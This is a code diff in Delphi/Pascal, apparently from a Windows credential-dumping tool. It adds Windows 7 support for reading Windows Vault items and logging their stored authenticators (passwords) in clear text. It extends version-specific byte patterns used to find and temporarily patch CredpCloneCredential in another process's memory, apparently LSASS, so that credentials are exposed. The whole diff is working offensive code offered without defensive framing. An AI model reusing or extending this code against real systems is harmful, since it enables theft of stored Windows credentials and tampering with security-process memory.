@@ -84,6 +84,21 @@ PVAULT_BYTE_BUFFER=^_VAULT_BYTE_BUFFER;
 
 
 
+type _VAULT_ITEM_7 =record
+	 SchemaId:GUID;
+	 FriendlyName:pointer; //PWSTR;
+	 Ressource:pointer; //or pointer
+	 Identity:pointer; //PVAULT_ITEM_DATA;
+	 Authenticator:pointer; //PVAULT_ITEM_DATA;
+	 PackageSid:pointer; //PVAULT_ITEM_DATA;
+	 LastWritten:FILETIME;
+	 Flags:DWORD;
+	 cbProperties:DWORD;
+	 Properties:pointer; //PVAULT_ITEM_DATA;
+end;
+PVAULT_ITEM_7=^_VAULT_ITEM_7;
+
+
 type _VAULT_ITEM_8 =record
 	 SchemaId:GUID;
 	 FriendlyName:pointer; //PWSTR;
@@ -107,7 +122,7 @@ VAULTCLOSEVAULT:function (vault:PHANDLE):ntstatus;stdcall;
 //VAULTGETINFORMATION:function ( vault:handle; unk0:dword;  informations:pointer{PVAULT_INFORMATION}):ntstatus;stdcall;
 VAULTENUMERATEITEMS:function (vault:phandle; unk0:dword;  cbItems:PDWORD; out items:PVOID):ntstatus;stdcall;
 //VAULTENUMERATEITEMTYPES:function (vault:handle; unk0:dword; cbItemTypes:PDWORD;itemTypes:PVAULT_ITEM_TYPE):ntstatus;stdcall;
-VAULTGETITEM7:function (vault:phandle; SchemaId:GUID; Resource:pointer{PVAULT_ITEM_DATA};Identity:pointer{PVAULT_ITEM_DATA}; hWnd:hwnd;  Flags:dword;  out pItem:pointer {PVAULT_ITEM_7}):ntstatus;stdcall;
+VAULTGETITEM7:function (vault:phandle; SchemaId:pointer; Resource:pointer{PVAULT_ITEM_DATA};Identity:pointer{PVAULT_ITEM_DATA}; hWnd:pointer;  Flags:dword;  out pItem:pointer {PVAULT_ITEM_7}):ntstatus;stdcall;
 {private static extern uint VaultGetItem8(IntPtr pVaultHandle, IntPtr pSchemaId, IntPtr pResource, IntPtr pIdentity, IntPtr pPackageSid, IntPtr hwndOwner, uint dwFlags, out IntPtr ppItems);}
 VAULTGETITEM8:function (vault:phandle; SchemaId:pointer{pointer/GUID}; Resource:pointer{PVAULT_ITEM_DATA};Identity:pointer{PVAULT_ITEM_DATA}; PackageSid:pointer{PVAULT_ITEM_DATA}; hWnd:pointer{hwnd};  Flags:dword;  out pItem:pointer {pointer/PVAULT_ITEM_8}):ntstatus;stdcall;
 
@@ -198,7 +213,7 @@ begin
         @VaultEnumerateItems := GetProcAddress(hVaultLib, 'VaultEnumerateItems');
         @VaultEnumerateVaults := GetProcAddress(hVaultLib, 'VaultEnumerateVaults');
         @VaultFree := GetProcAddress(hVaultLib, 'VaultFree');
-        //@VAULTGETITEM7 := GetProcAddress(hVaultLib, 'VaultGetItem');
+        @VAULTGETITEM7 := GetProcAddress(hVaultLib, 'VaultGetItem');
         @VAULTGETITEM8 := GetProcAddress(hVaultLib, 'VaultGetItem');
         @VaultOpenVault := GetProcAddress(hVaultLib, 'VaultOpenVault');
         @VaultCloseVault := GetProcAddress(hVaultLib, 'VaultCloseVault');
@@ -213,7 +228,7 @@ begin
     end;
 
     result:= bStatus;
-    if result=false then log('vault init=false');
+    if result=false then log('vault init=false') else log('vault init=true')
 end;
 
 //check against vaultcmd
@@ -256,6 +271,8 @@ begin
                        if VaultEnumerateItems(hVault, $200, @cbItems, pitems)=0 then
                           begin
                           log('VaultEnumerateItems OK, '+inttostr(cbitems));
+                          if cbitems>0 then
+                          begin
                           ptr2:=pitems;
                           for j:=0 to cbItems -1 do
                               begin
@@ -267,12 +284,16 @@ begin
                               CopyMemory (@vie,PVAULT_ITEM_8(ptr2).Identity  ,sizeof(vie));
                               log('User:'+pwidechar(vie.data),1);
                               pitem8 :=nil;
-                              status:= VaultGetItem8(hVault, pointer(@PVAULT_ITEM_8(ptr2).SchemaId), PVAULT_ITEM_8(ptr2).Ressource, PVAULT_ITEM_8(ptr2).Identity, PVAULT_ITEM_8(ptr2).PackageSid,0, 0, pitem8 );
+                              if pos('6.1',winver)>0
+                                 then status:= VaultGetItem7(hVault, pointer(@PVAULT_ITEM_7(ptr2).SchemaId), PVAULT_ITEM_7(ptr2).Ressource, PVAULT_ITEM_7(ptr2).Identity, 0, 0, pitem8 )
+                                 else status:= VaultGetItem8(hVault, pointer(@PVAULT_ITEM_8(ptr2).SchemaId), PVAULT_ITEM_8(ptr2).Ressource, PVAULT_ITEM_8(ptr2).Identity, PVAULT_ITEM_8(ptr2).PackageSid,0, 0, pitem8 );
                               if status=0 then
                                  begin
                                      result:=true;
-                                     log('GetItemW8 OK');
-                                     CopyMemory (@vie,PVAULT_ITEM_8(pItem8).Authenticator  ,sizeof(vie));
+                                     log('GetItem OK');
+                                     if pos('6.1',winver)>0
+                                        then CopyMemory (@vie,PVAULT_ITEM_7(pItem8).Authenticator  ,sizeof(vie))
+                                        else CopyMemory (@vie,PVAULT_ITEM_8(pItem8).Authenticator  ,sizeof(vie));
                                      if vie.veType=ElementType_String then
                                            begin
                                            log('Authenticator:'+pwidechar(vie.data),1);
@@ -294,11 +315,11 @@ begin
                                            end;
                                     VaultFree(pItem8);
                                     end
-                                    else log('GetItemW8 NOT OK, '+inttostr(status));
+                                    else log('GetItem NOT OK, '+inttostr(status));
 
                               inc(ptr2,sizeof(_VAULT_ITEM_8));
                               end; //for j
-
+                              end; //if cbitems>0 then
                           VaultFree(pitems);
                           end; //VaultEnumerateItems
                        VaultCloseVault(hVault);
@@ -327,7 +348,13 @@ begin
 
   if LowerCase (osarch )='amd64' then
      begin
-     if copy(winver,1,3)='6.0' then //and 6.1 ?
+     if copy(winver,1,3)='6.0' then
+         begin
+         setlength(pattern,length(PTRN_WN60_CredpCloneCredential));
+         CopyMemory (@pattern[0],@PTRN_WN60_CredpCloneCredential[0],length(PTRN_WN60_CredpCloneCredential));
+         offset:=7;
+         end;
+     if copy(winver,1,3)='6.1' then //same as 6.0 ...
          begin
          setlength(pattern,length(PTRN_WN60_CredpCloneCredential));
          CopyMemory (@pattern[0],@PTRN_WN60_CredpCloneCredential[0],length(PTRN_WN60_CredpCloneCredential));
@@ -351,7 +378,7 @@ begin
          CopyMemory (@pattern[0],@PTRN_WN10_1607_CredpCloneCredential[0],length(PTRN_WN10_1607_CredpCloneCredential));
          offset:=7;
          end;
-     if (pos('-1703',winver)>0) then
+     if (pos('-1703',winver)>0) or (pos('-1709',winver)>0) then
          begin
          setlength(pattern,length(PTRN_WN10_1703_CredpCloneCredential));
          CopyMemory (@pattern[0],@PTRN_WN10_1703_CredpCloneCredential[0],length(PTRN_WN10_1703_CredpCloneCredential));
@@ -399,7 +426,7 @@ var
   pattern:tbytes;
 begin
   result:=false;
-  if pid=0 then exit;
+  if pid=0 then begin log('pid=0');exit;end;
   //if user='' then exit;
   //
   if (lowercase(osarch)='amd64') then
@@ -408,13 +435,13 @@ begin
      if (pos('-1809',winver)>0) then
         begin
         setlength(after,sizeof(PATC_WN64_CredpCloneCredentialJmpShort));
-        setlength(backup,sizeof(after));
+        setlength(backup,sizeof(PATC_WN64_CredpCloneCredentialJmpShort));
         copymemory(@after[0],@PATC_WN64_CredpCloneCredentialJmpShort[0],sizeof(PATC_WN64_CredpCloneCredentialJmpShort));
         end
         else
         begin
-        setlength(after,1);
-        setlength(backup,sizeof(after));
+        setlength(after,sizeof(PATC_WALL_CredpCloneCredentialJmpShort));
+        setlength(backup,sizeof(PATC_WALL_CredpCloneCredentialJmpShort));
         copymemory(@after[0],@PATC_WALL_CredpCloneCredentialJmpShort[0],sizeof(PATC_WALL_CredpCloneCredentialJmpShort));
         end;
      end;
@@ -471,7 +498,7 @@ begin
                                    log('ReadProcessMemory OK '+leftpad(inttohex(backup[0],1),2));
                                    if WriteMem(hprocess,offset+patch_pos,after)=true then
                                         begin
-                                        log('patch ok',0);
+                                        log('patch0 ok',0);
                                         try
                                         log('***************************************',0);
                                         try
@@ -481,7 +508,7 @@ begin
                                         except end;
                                         log('***************************************',0);
                                         finally //we really do want to patch back
-                                        if WriteMem(hprocess,offset+patch_pos,backup)=true then log('patch ok') else log('patch1 failed');
+                                        if WriteMem(hprocess,offset+patch_pos,backup)=true then log('patch1 ok') else log('patch1 failed');
                                         //should we read and compare before/after?
                                         end;
                                         end
